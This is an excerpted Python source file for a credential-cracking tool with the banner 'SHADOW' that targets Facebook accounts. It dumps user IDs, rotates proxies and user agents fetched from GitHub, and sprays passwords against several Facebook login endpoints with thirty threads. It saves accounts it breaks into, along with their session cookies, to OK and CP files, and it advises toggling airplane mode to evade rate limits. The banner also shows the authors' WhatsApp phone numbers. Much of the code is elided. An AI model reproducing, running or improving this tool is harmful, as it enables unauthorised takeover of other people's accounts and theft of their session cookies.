...
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/Dodd-donald/Allinone/main/prox.txt').text
...
try:
	agent = open('bot.txt','r').read().splitlines()
except Exception as e:
	print('YO MOTHERFUCKER')
	print('YOU ARE NOT A PRO')
agent = open('bot.txt','r').read().splitlines() 
...
def jalan(z):
    for e in z + '\n':
        ...
        time.sleep(0.03)
#try:
	#os.system('curl https://raw.githubusercontent.com/De-Master-Hacker/Hacker/main/socks4.txt -o socks4.txt')
#except:
	#pass
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Dodd-donald/Allinone/blob/main/user-agents.txt').text
...
#------------[ COLOURS ]--------------#
P = '\x1b[1;97m' #WHITE
M = '\x1b[1;91m' #BOLD-YELLOW
H = '\x1b[1;92m' #BOLD-GREEN
K = '\x1b[1;93m' #BOLD-YELLOW
B = '\x1b[1;94m' #BOLD-BLUE
U = '\x1b[1;95m' #MAGENTA
G='\033[38;2;255;127;0;1m' #ORANGE
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m" #GRAY
sir = '\033[41m\x1b[1;97m' #MIXED
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # BOLD-YELLOW +
h = '\x1b[1;92m' # BOLD-GREEN +
hh = '\033[32m' # GREEN -
u = '\033[95m' # MAGENTA
kk = '\033[33m' # YELLOW -
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	cetak(nel('\t   [cyan]Welcome [green]Mr/Mrs [yellow]%s[yellow] '%(my_name)))
	ip = requests.get("https://api.ipify.org").text
	renv_xy(f'{B}[{h}•{B}]{h}YOUR ID : '+str(my_id))
	renv_xy(f'{B}[{h}•{B}]{h}YOUR IP : {ip}')
	print(f'{B}[{h}•{B}]{h}Status : {k}PREMIUM')
	print (f'{B}[{h}•{B}]{h}Author : De-Master Hacker & NightRage')
	print(f'{B}[{h}•{B}]{h}De-Master WTSAP : {k}+2349047368495')
	print(f'{B}[{h}•{B}]{h}NightRage WTSAP : {k}+2348140479685')
	print(f'{B}_______________________________________________________')
	cetak(nel('[purple]MAIN-MENU [green]<<<[cyan] SHADOW ALL NOOBS TOGETHER[green]>>>'))
	print('')
	print(f'{B}[{u}1{h}.{B}]{h} CRACK PUBLIC')
	print(f'{B}[{u}2{h}.{B}]{h} CHECK CRACKED RESULTS ')
	print(f'{B}[{u}0{h}.{B}]{h} LOGOUT')
	...
	if _____renv__renv_____ in ['1']:
		...
		print(f'{h} Successfully Logged Out/Deleted Cookies ')
		exit()
	else:
		print('input correctly ')
		back()
def error():
	print(f'{B}[{h}•{B}]{m}Sorry, this feature is still being fixed {h}')
	time.sleep(4)
	back()
	#-----------------[CRACK-RESULT ]-----------------#
def result():
	print(f'{B}[{u}1{h}.{B}]{k} CHECK CP RESULT ')
	print(f'{B}[{u}2{h}.{B}]{h} CHECK OK RESULT ')
	print(f'{B}[{u}0{h}.{B}]{h} RETURN	')
	kz = input('\n╚═➣ CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'{b}[{m}×{b}]{m}File Not Found ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'{k}You Dont Have CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print(f'{k}You Dont Have OK File ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(nel('[purple]TARGET [green]<<<[cyan]SHADOW ALL NOOBS TOGETHER [green]>>>'))
		jum = int(input(f'{h}╚═➣ ENTER ID LIMIT: '))
	except ValueError:
		print('{k}╚═➣ wrong input ')
		exit()
	if jum<1 or jum>100:
		print('{k}╚═➣  Failed To Dump IDs, maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{h}╚═➣ Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print(f'{m}unstable signal ')
			exit()
	try:
		print('')
		print(f'{h}TOTAL IDs COLLECTED:{k}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{h}')
		print(f'{m} unstable signal ')
		...
		print('{k}╚═➣  Friendship Not Public {h}')
		time.sleep(3)
		back()
#-------------[ SETTINGS-IDZ ]---------------#
def setting():
	cetak(nel('[purple]ID SETTINGS [green]<<<[cyan]SHADOW ALL NOOBS TOGETHER [green]>>>'))
	print(f'{B}[{u}1{h}.{B}]{h} CRACK OLD IDS') 
	print(f'{B}[{u}2{h}.{B}]{h} CRACK NEW IDS') 
	print(f'{B}[{u}3{h}.{B}]{h} CRACK RANDOM IDS') 
	print('')
	hu = input('╚═➣ CHOOSE: ')
	if hu in ['1','01']:
	...
	cetak(nel('[purple]CRACK METHOD [green]<<<[cyan]SHADOW ALL NOOBS TOGETHER [green]>>>'))
	print(f'{B}[{u}1{h}.{B}]{h} MOBILE FACEBOOK') 
	print(f'{B}[{u}2{h}.{B}]{h} FREE FACEBOOK') 
	print(f'{B}[{u}3{h}.{B}]{h} MBASIC FACEBOOK') 
	print('')
	hc = input('╚═➣ CHOOSE: ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	pwplus=input('[•] Add Manual Password ( Y/n ) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] manual Password Should Be 6 Character Minimal\n[[purple]•[yellow]] Example :[green] Ogbonna,Nkechi,Emeka[purple] '))
		pwku=input('╚═➣ Input Manual Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	print('')
	print(f'{B}[{m}•{B}]{h}OK RESULTS STORED IN: OK/%s {b}'%(okc))
	print(f'{B}[{m}•{B}]{k}CP RESULTS STORED IN: CP/%s {b}'%(cpc))
	cetak(nel('\r[cyan]USE AIRPLANE MODE EVERY [red]1K[cyan] ID'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('[green] SUCCESSFULLY CRACKED, DONT FORGET TO SEND YOUR FEEDBACK AFTER USING OUR SCRIPT '))
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f'\t{b}GOOD BYE OUR FRIEND, SEE YOU AGAIN ')
#--------------------[ MOBILE-METHOD ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	...
	fff = '%'
	print(f'\r{B}SHADOW {G}%s{G}%s{B}/{G}%s {h}OK:%s  {k}CP:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}SHADOW-CP {k}{idf} | {pw}{N}\n{b}User-Agent {u}{ua}\n')
				...
				print(f'\r{b}SHADOW-OK {H}{idf} | {pw}\n{H}{kuki}\n{b}User-Agent {u}{ua}')
...
def crackfree(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r{bo}SHADOW %s{u}%s{x}/{b}%s {h}OK:%s  {k}CP:%s {bo}%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}shadow-cp {M}{k}{idf} | {pw}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{b} shadow-ok {M}{H}{idf} | {pw}\n{H}{kuki}{N}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				cek_apk(session,coki)
				break
...
def crackmbasic(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r{k}[%s{u}%s/{b}%s{k}] {h}OK:%s{x}/{k}CP:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(uasm)
	ua2 = random.choice(uasm)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}CHECKPOINT {M}{k}{idf} | {pw}{N}\n{b} User Agent {u}{ua}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{b} SUCCESSFUL {M}{H}{idf} | {pw}\n{H}{kuki}{x}\n{b}User Agent {u}{ua}\n\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				cek_apk(session,coki)
				break
